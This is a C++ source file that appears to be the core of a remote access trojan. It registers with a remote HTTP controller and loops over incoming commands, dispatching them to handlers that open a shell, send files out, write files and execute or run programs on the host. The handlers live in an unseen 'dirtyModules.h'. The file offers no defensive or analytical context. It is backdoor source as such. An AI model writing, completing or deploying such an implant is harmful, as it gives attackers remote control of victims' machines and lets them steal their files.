
#include <iostream>
#include <vector>
#include "dirtyModules.h"
#include "requests.h"

typedef enum 
opcao{op_openShell,op_sendfile,op_writefile,
        op_execute,op_install,op_run,op_nop} options;

using namespace std;

options cmd2Enum( string& cmd )
{
    options result=op_nop;
    vector<string> cmds={"openShell","sendfile","writefile","execute","install","run","nop"};

    for(unsigned i=0;  i < cmds.size();i++ ){
        if (cmd==cmds[i]){
            result=static_cast<options>(i);
            break;
        }
    }
    return result ;
}

int main(){
    httpManager manager;
    
    manager.makeRegister();

    while (1){
        commandInput cmd= manager.getComand();

        options option=cmd2Enum(cmd.argv[0]);
        //removes first item becouse its not argv
        cmd.argv.erase(cmd.argv.begin());

        switch (option)
        {
        case op_openShell:
            cout << "opening shell" << endl;
            openShell(cmd,manager);
            break;

        case op_sendfile:
            cout << "op_sendfile" << endl;
            sendfile(cmd,manager);
            break;
        
        case op_writefile:
            cout << "op_writefile" << endl;
            writefile(cmd,manager);
            break;
        
        case op_execute:
            cout << "op_execute" << endl;
            execute(cmd,manager);
            break;

        case op_run:
            cout << "op_run" << endl;
            run(cmd,manager);
            break;

        case op_nop:
            cout << "NOP" << endl;
            break;
        
        default:
            cout << "unkownOption" << endl;
            break;
        }

    }
}